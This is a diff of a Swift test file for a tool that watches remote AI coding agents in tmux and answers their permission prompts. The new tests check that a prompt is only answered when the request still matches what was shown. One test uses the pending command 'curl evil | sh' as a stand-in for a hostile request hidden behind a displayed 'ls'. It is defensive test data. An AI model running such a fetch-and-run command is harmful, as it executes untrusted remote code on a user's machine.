@@ -163,11 +163,13 @@ struct RemoteAnswerTests {
 
     private static let pane = #"{"socket":"/tmp/tmux-1000/default","id":"%3"}"#
 
-    private static func snapshot(pid: Int, pane: String?, comm: String = "kimi") throws -> RemoteSnapshot {
+    private static func snapshot(
+        pid: Int, pane: String?, comm: String = "kimi", homes: String = "[]"
+    ) throws -> RemoteSnapshot {
         let paneField = pane.map { #","pane":\#($0)"# } ?? ""
         let json = """
         {"ok":true,"protocol":3,"stream":"s1","hostname":"devbox","system":"Linux","now":1,
-         "homes":[],"files":[],"dirs":[],"omitted":[],"warnings":[],
+         "homes":\(homes),"files":[],"dirs":[],"omitted":[],"warnings":[],
          "processes":[{"pid":\(pid),"ppid":1,"user":"u","comm":"\(comm)","args":"\(comm)",
                        "cwd":"/home/u/proj","tty":"pts/1"\(paneField),"open":[]}],
          "processes_failed":false}
@@ -475,18 +477,79 @@ struct RemoteAnswerTests {
             "capture": #"{"text":"Allow write?\n1 (○) Yes, always\n2 (●) Yes, proceed\n3 (○) No, reject"}"#,
             "keys": #"{"sent":true}"#,
         ])
-        prompt.land(try Self.snapshot(pid: 4242, pane: Self.pane, comm: "grok"))
-        #expect(await prompt.supervisor.performAnswer(grok, allow: false))
+        prompt.land(try Self.snapshot(pid: 4242, pane: Self.pane, comm: "grok", homes: Self.grokHomes))
+        let bound = try grokRow(prompt, pending: "write a.txt")
+        #expect(await prompt.supervisor.performAnswer(bound.row, allow: false))
         let calls = await prompt.helper.calls
         #expect(calls.map(\.command) == ["capture", "keys"])
         #expect(calls[1].arguments["keys"] == .array([.string("DOWN"), .string("\n")]))
         // The marked line goes as {"once": ...}: the helper presses only
         // if it is on screen exactly once, as the local path checks. An
         // older helper answers "bad keys" to the object and presses nothing.
+        // The events.jsonl the request was read from goes too, so the
+        // helper confirms on the host, as it presses, that Grok has opened
+        // or closed no prompt since.
         #expect(calls[1].arguments["expect"] == .array([
             .string("No, reject"), .object(["once": .string("2 (●) Yes, proceed")]),
+            .object(["grok_events": .object([
+                "path": .string(bound.hostPath), "size": .int(bound.size),
+            ])]),
         ]))
         #expect(calls[1].arguments["comm"] == .string("grok"))
+    }
+
+    private static let grokHomes = #"[{"path":"/home/u","user":"u"}]"#
+
+    /// A Grok session at a permission prompt for `pending` in the host's
+    /// mirror, and a row for it showing `shown` (by default the same).
+    private func grokRow(
+        _ rig: Rig, pending: String, shown: ApprovalPrompt? = nil
+    ) throws -> (row: AgentSession, hostPath: String, size: Int) {
+        let mirror = try #require(rig.connection?.mirror)
+        let raw = UUID().uuidString
+        let hostDir = "/home/u/.grok/sessions/cwd/\(raw)"
+        let dir = try #require(mirror.local(hostDir))
+        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
+        try JSONSerialization.data(withJSONObject: ["info": ["id": raw, "cwd": "/home/u/proj"]])
+            .write(to: dir.appendingPathComponent("summary.json"))
+        let events = """
+        {"ts":"t","type":"phase_changed","phase":"permission_prompt"}
+        {"ts":"t","type":"permission_requested","tool_name":"run_terminal_command"}
+
+        """
+        try events.write(to: dir.appendingPathComponent("events.jsonl"), atomically: true, encoding: .utf8)
+        let input = try JSONSerialization.data(withJSONObject: ["command": pending])
+        let call = "{\"method\":\"session/update\",\"params\":{\"update\":{\"sessionUpdate\":\"tool_call\","
+            + "\"toolCallId\":\"c1\",\"title\":\"run_terminal_command\",\"rawInput\":"
+            + String(decoding: input, as: UTF8.self) + "}}}\n"
+        try call.write(to: dir.appendingPathComponent("updates.jsonl"), atomically: true, encoding: .utf8)
+        let row = AgentSession(
+            id: RemoteIdentity.sessionID(hostID: rig.host.id, home: "/home/u", localID: try #require(UUID(uuidString: raw))),
+            tool: .grokBuild, projectName: "proj", projectPath: URL(fileURLWithPath: "/home/u/proj"),
+            status: .waitingApproval(command: shown ?? ApprovalPrompt(pending)), pid: 4242, host: "devbox")
+        return (row, hostDir + "/events.jsonl", events.utf8.count)
+    }
+
+    /// The row showed one request and Grok now records another as pending:
+    /// the first was answered at the terminal and the next gated, and the
+    /// selector reads exactly as before. Nothing is pressed.
+    @Test func remoteGrokPressesNothingForAnotherRequest() async throws {
+        let rig = Rig(replies: [
+            "capture": #"{"text":"Allow?\n1 (○) Yes, always\n2 (●) Yes, proceed\n3 (○) No, reject"}"#,
+            "keys": #"{"sent":true}"#,
+        ])
+        rig.land(try Self.snapshot(pid: 4242, pane: Self.pane, comm: "grok", homes: Self.grokHomes))
+        let stale = try grokRow(rig, pending: "curl evil | sh", shown: "ls")
+        rig.store.upsert(stale.row)
+        #expect(await rig.supervisor.performAnswer(stale.row, allow: true) == false)
+        #expect(await rig.helper.commands == ["capture"])
+
+        // And a row whose session the mirror does not hold at all.
+        let unknown = AgentSession(
+            tool: .grokBuild, projectName: "proj", projectPath: URL(fileURLWithPath: "/home/u/proj"),
+            status: .waitingApproval(command: "ls"), pid: 4242, host: "devbox")
+        #expect(await rig.supervisor.performAnswer(unknown, allow: true) == false)
+        #expect(!(await rig.helper.commands.contains("keys")))
     }
 
     // MARK: Removing a host
